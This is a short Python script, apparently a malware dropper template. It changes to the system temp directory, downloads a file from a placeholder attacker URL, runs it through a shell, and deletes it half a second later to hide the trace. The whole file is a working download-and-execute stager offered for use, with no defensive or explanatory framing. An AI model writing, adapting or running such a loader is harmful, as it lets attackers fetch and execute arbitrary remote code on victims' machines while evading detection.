import requests, subprocess, os, tempfile, time

evilfile = "%EVILURL%"
evilname = "%EVILNAME%"

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download(evilfile)
subprocess.call(evilname, shell=True)


time.sleep(0.5)
os.remove(evilname)